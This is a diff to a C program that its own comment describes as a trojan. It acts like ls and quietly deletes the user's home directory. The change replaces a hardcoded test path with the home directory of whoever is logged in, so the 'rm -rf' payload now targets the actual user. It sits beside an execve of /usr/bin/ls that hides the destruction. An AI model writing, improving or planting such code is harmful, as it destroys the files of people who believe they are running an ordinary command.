@@ -1,7 +1,8 @@
-/*  This program quietly deletes everything in the home directory while performing the function of ls. Use wisely  */
+/*  This program quietly deletes everything in the user's home directory while performing the function of ls. Use with discretion  */
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <string.h>
 
 int main(int argc, char **argv) {
   
@@ -9,11 +10,15 @@ int main(int argc, char **argv) {
     // This is the program the user thinks is being run
     execve("/usr/bin/ls", argv, NULL);
   else {
-   // Prepare the payload
 
+   // Get the user's home directory
+   char user_directory[1024] = "/home/";   
+   strcat(user_directory, getlogin());
+
+   // Assemble the payload
    char *payload_argv[] = {"rm",
                            "-rf",
-                           "/home/test",
+                           user_directory,
                            NULL};
     
    // Execute the payload
